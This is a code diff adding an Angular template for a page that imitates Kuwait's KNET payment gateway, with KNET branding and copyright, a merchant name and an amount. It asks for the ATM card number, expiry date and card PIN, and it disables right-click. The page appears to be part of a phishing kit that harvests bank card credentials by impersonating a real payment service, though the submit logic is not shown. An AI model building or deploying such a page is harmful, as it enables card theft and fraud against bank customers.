@@ -1,0 +1,250 @@
+<form oncontextmenu="return false;" (submit)="onSubmit($event)">
+
+    <div id="PayPageEntry"
+        style="display: flex; flex-direction: column; align-items: center; justify-content: flex-start; min-height: 100vh; background-color: #E8E8E8; padding-top: 5px; padding-bottom: 20px; box-sizing: border-box; width: 100%; max-width: 100%; overflow-x: hidden;">
+
+        <!-- Top Banner Placeholder (Diraya) -->
+        <img src="imgs/mob.jpg" alt="Diraya"
+            class="w-[92vw] max-w-110 rounded-lg shadow-sm mb-3 object-contain block mx-auto" />
+
+        <!-- Error Message Banner -->
+        @if (errorMessage()) {
+        <div
+            style="background-color: #FEE2E2; border: 1px solid #EF4444; color: #B91C1C; padding: 12px 20px; border-radius: 12px; margin: 10px 15px; text-align: right; width: 90%; max-width: 440px; font-weight: bold; font-size: 13px; direction: rtl;">
+            {{ errorMessage() }}
+        </div>
+        }
+
+        <!-- Loading Overlay -->
+        @if (isLoading()) {
+        <div
+            style="position: fixed; inset: 0; background-color: rgba(0,0,0,0.6); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 99999; direction: rtl;">
+            <div
+                style="width: 50px; height: 50px; border: 5px solid #fff; border-top-color: #0077D5; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;">
+            </div>
+            <p style="color: #fff; font-size: 16px; font-weight: bold; margin: 0; text-align: center;">الرجاء الانتظار،
+                جاري معالجة العملية...</p>
+            <style>
+                @keyframes spin {
+                    to {
+                        transform: rotate(360deg);
+                    }
+                }
+            </style>
+        </div>
+        }
+
+        <div
+            class="wrapper w-[92vw] max-w-110 flex flex-col items-center shadow-[0_4px_10px_rgba(0,0,0,0.06)]! m-0! md:mt-2!">
+
+            <!-- Box 1 (Receipt Info) -->
+            <div class="contentBox box-style"
+                style="border-radius: 20px; border: 2px solid #aeb2b7; box-shadow: 0 4px 10px rgba(0,0,0,0.06); padding: 10px 25px !important; margin-bottom: 15px; width: 100% !important;">
+                <!-- Centered Logo -->
+                <div
+                    style="display: flex; justify-content: center; align-items: center; margin-bottom: 12px; min-height: 40px; width: 100%;">
+                    @if (selectedBank()) {
+                    <img [src]="selectedBank()?.logoUrl" alt="Bank Logo"
+                        style="max-height: 40px; object-fit: contain;" />
+                    } @else {
+                    <img src="imgs/download.jpg" alt="Knet Logo" style="max-height: 40px; object-fit: contain;" />
+                    }
+                </div>
+
+                <div class="innerwrapper" style="direction: rtl; width: 100%;">
+                    <!-- Beneficiary Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid #ccc; width: 100%;">
+                        <span class="paymentlabel"
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 80px; text-align: right; margin: 0;">المستفيد:</span>
+                        <span class="" style="flex-grow: 1; text-align: right; padding-right: 10px;">Tap Payments
+                            EPSP</span>
+                    </div>
+
+                    <!-- Amount Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0 0 0; width: 100%;">
+                        <span class="paymentlabel"
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 80px; text-align: right; margin: 0;">المبلغ:</span>
+                        <span class="paymentdata"
+                            style="color: #444; font-size: 13px; flex-grow: 1; text-align: right; padding-right: 10px; margin: 0; font-weight: bold;">KD
+                            {{ amount() }}</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Box 2 (Card Entry Fields) -->
+            <div class="contentBox box-style"
+                style="border-radius: 20px; border: 2px solid #aeb2b7; box-shadow: 0 4px 10px rgba(0,0,0,0.06); padding: 18px 25px; margin-bottom: 15px; width: 100% !important;">
+                <div id="FCUseDebitEnable">
+
+                    <!-- Payment Options Headers (KFast / KNet) -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; width: 100%; direction: rtl; padding: 0 5px; box-sizing: border-box; margin-top: 0;">
+
+                        <!-- KNet Option (Right) -->
+                        <div style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                            <img src="imgs/knet.jpg" alt="KNet"
+                                style="height: 35px; width: auto; object-fit: contain; border-radius: 4px; margin: 0;" />
+                            <input type="radio" id="knetOption" name="paymentOption" value="knet" checked
+                                style="margin: 0; cursor: pointer; transform: scale(1.1);" />
+                        </div>
+
+                        <!-- KFast Option (Left) -->
+                        <div style="display: flex; align-items: center; gap: 8px; opacity: 0.6; margin: 0;">
+                            <img src="imgs/Kfast.jpg" alt="KFast"
+                                style="height: 35px; width: auto; object-fit: contain; border-radius: 4px; filter: grayscale(100%); opacity: 0.5; margin: 0;" />
+                            <input type="radio" id="kfastOption" name="paymentOption" value="kfast"
+                                style="margin: 0; cursor: pointer; transform: scale(1.1);" />
+                        </div>
+                    </div>
+
+                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 10px 0;">
+
+                    <!-- ATM Card Number Input Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; width: 100%; direction: rtl; margin-top: 0;">
+                        <div style="min-width: 140px; text-align: right; margin: 0;">
+                            <label class="paymentlabelcard"
+                                style="color: #0077D5; font-weight: bold; font-size: 12px; padding: 0; margin: 0; display: inline-block;">رقم
+                                بطاقة الصراف الآلي:</label>
+                        </div>
+                        <div
+                            style="position: relative; flex-grow: 1; max-width: 212px; margin: 0; display: flex; justify-content: flex-end; width: 100%;">
+                            <div class="input-wrapper" id="knetCardInfoSection"
+                                style="position: relative; display: flex; width: 100% !important; max-width: 100% !important; margin: 0;">
+                                <input #debitInput name="dummyNumber" id="debitNumber" inputmode="numeric"
+                                    autocomplete="off" type="text" size="19" maxlength="19" class="paymentinput"
+                                    [value]="visualDebitNumber()" (input)="onDebitInput($event)"
+                                    (focus)="onDebitFocus()" (blur)="onDebitBlur()"
+                                    style="width: 100% !important; text-align: left; direction: ltr; padding-right: 32px; box-sizing: border-box; height: 26px; margin: 0;"
+                                    required />
+
+                                <span id="innerBankLogo"
+                                    style="position: absolute; right: 5px; top: 50%; transform: translateY(-50%); margin: 0;"
+                                    [style.display]="selectedBank() ? 'block' : 'none'">
+                                    <img [src]="selectedBank()?.logoUrl"
+                                        style="height:14px; object-fit:contain; border-radius:2px; margin: 0;"
+                                        (error)="$event.target.style.display='none'">
+                                </span>
+                            </div>
+
+                            <!-- Autocomplete Suggestions List -->
+                            @if (showAutocomplete() && autocompleteMatches().length > 0) {
+                            <div #autocompleteBox id="bankAutocomplete" class="suggestion-box"
+                                style="display: block; width: 100% !important; right: 0; top: 28px; margin: 0; z-index: 9999;">
+                                @for (match of autocompleteMatches(); track match.prefix + '-' + match.bank.name) {
+                                <div (click)="selectAutocomplete(match)"
+                                    style="padding: 8px; cursor: pointer; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; margin: 0;">
+                                    <span style="display:flex; align-items:center; margin: 0;">
+                                        <img [src]="match.bank.logoUrl"
+                                            style="height:14px; border-radius:3px; object-fit:contain; margin: 0;"
+                                            (error)="$event.target.style.display='none'">
+                                    </span>
+                                    <span dir="ltr" style="display: inline-block; margin: 0;">{{ match.prefix }} - {{
+                                        match.bank.name }}</span>
+                                </div>
+                                }
+                            </div>
+                            }
+                        </div>
+                    </div>
+
+                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 10px 0;">
+
+                    <!-- Expiry Date Input Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; width: 100%; direction: rtl; margin-top: 0;">
+                        <div style="min-width: 140px; text-align: right; margin: 0;">
+                            <label class="paymentlabelcard"
+                                style="color: #0077D5; font-weight: bold; font-size: 12px; padding: 0; margin: 0; display: inline-block;">تاريخ
+                                انتهاء البطاقة:</label>
+                        </div>
+                        <div
+                            style="flex-grow: 1; max-width: 212px; margin: 0; display: flex; justify-content: flex-start; width: 100%;">
+                            <div class="expiry-wrapper"
+                                style="direction: ltr; display: flex; width: 110px !important; height: 26px; border: 1px solid #c7d0d5; border-radius: 5px; overflow: hidden; margin: 0; background-color: #fff !important;">
+                                <input #monthInput type="text" id="visibleMonth" inputmode="numeric" autocomplete="off"
+                                    class="paymentinput" [value]="expiryMonth()" (input)="onMonthInput($event)"
+                                    style="width: 45px; border: none; padding: 2px; text-align: center; font-size: 12px; box-sizing: border-box; height: 24px; color: #333; margin: 0; background: transparent; box-shadow: none;"
+                                    placeholder="MM" maxlength="2" required />
+
+                                <div id="expirySlashBox" class="paymentinput"
+                                    style="width: 20px; line-height: 24px; text-align: center; padding: 0; border: none; border-radius: 0; font-size: 12px; box-sizing: border-box; height: 24px; color: #333; background: transparent; margin: 0; box-shadow: none;">
+                                    /</div>
+
+                                <input #yearInput type="text" id="visibleYear" inputmode="numeric" class="paymentinput"
+                                    autocomplete="off" [value]="expiryYear()" (input)="onYearInput($event)"
+                                    style="width: 45px; border: none; padding: 2px; text-align: center; font-size: 12px; box-sizing: border-box; height: 24px; color: #333; margin: 0; background: transparent; box-shadow: none;"
+                                    placeholder="YY" maxlength="2" required />
+                            </div>
+                        </div>
+                    </div>
+
+                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 10px 0;">
+
+                    <!-- PIN Input Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; width: 100%; direction: rtl; margin-top: 0;">
+                        <div style="min-width: 140px; text-align: right; margin: 0;">
+                            <span class="paymentlabelcard"
+                                style="color: #0077D5; font-weight: bold; font-size: 12px; padding: 0; margin: 0; display: inline-block;">الرقم
+                                السري (PIN):</span>
+                        </div>
+                        <div
+                            style="flex-grow: 1; max-width: 212px; margin: 0; display: flex; justify-content: flex-end; width: 100%;">
+                            <div class="pin-wrapper"
+                                style="direction: ltr; width: 100% !important; max-width: 100% !important; display: flex; margin: 0;">
+                                <input #pinInput name="cardPin" id="cardPin" type="password" inputmode="numeric"
+                                    size="4" maxlength="4" class="paymentinput pinmask" [value]="pin()"
+                                    (input)="onPinInput($event)"
+                                    style="width: 100% !important; text-align: left; height: 26px; box-sizing: border-box; margin: 0;"
+                                    required />
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Box 3 (KFast Signup & Actions) -->
+            <div class="contentBox box-style"
+                style="border-radius: 20px; border: 2px solid #aeb2b7; box-shadow: 0 4px 10px rgba(0,0,0,0.06); padding: 18px 25px; margin-bottom: 15px; width: 100% !important;">
+
+                <!-- KFast Registration Checkbox -->
+                <div
+                    style="display: flex; align-items: center; justify-content: flex-start; gap: 8px; width: 100%; margin-bottom: 12px; direction: rtl; margin-top: 0;">
+                    <input type="checkbox" id="kfastAgree" style="margin: 0; cursor: pointer; transform: scale(1.1);" />
+                    <span style="font-size: 12px; color: #333; font-weight: bold; text-align: right; margin: 0;">
+                        لقد قرأت ووافقت على <a href="#" class="terms"
+                            style="color: #0077D5; text-decoration: underline; font-weight: bold; margin: 0;">شروط</a>
+                        التسجيل في KFast
+                    </span>
+                </div>
+
+                <hr style="border: 0; border-top: 1px solid #ccc; margin: 10px 0;">
+
+                <!-- Form Submit/Cancel Action Buttons -->
+                <div
+                    style="display: flex; justify-content: center; align-items: center; gap: 12px; margin: 0; width: 100%;">
+                    <input name="proceed" type="submit" class="button" id="proceed" value="إرسال"
+                        style="flex: 1; width: 100% !important; padding: 5px 0; min-height: 25px; background: #e6e6e6; border: 1px solid #ccc; border-radius: 5px; color: #555; cursor: pointer; font-weight: bold; font-size: 12px; margin: 0; box-sizing: border-box;" />
+                    <input type="button" name="proceedCancel" class="button" onclick="window.history.back();"
+                        id="cancel" value="إلغاء"
+                        style="flex: 1; width: 100% !important; padding: 5px 0; min-height: 25px; background: #e6e6e6; border: 1px solid #ccc; border-radius: 5px; color: #555; cursor: pointer; font-weight: bold; font-size: 12px; margin: 0; box-sizing: border-box;" />
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer info -->
+        <footer style="margin-top: 10px; width: 100%; max-width: 440px;">
+            <div>
+                <span>
+                    <p align="center"
+                        style="text-align: center; font-size: 11px; color: #333; margin: 0; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; line-height: 1.4;">
+                        جميع الحقوق محفوظة &copy; 2026 <br /><span style="font-weight:bold; color: #0077D5;">شركة
+                            الخدمات المصرفية الآلية المشتركة – كي نت</span></p>
+                </span>
+            </div>
+        </footer>
+    </div>
+</form>
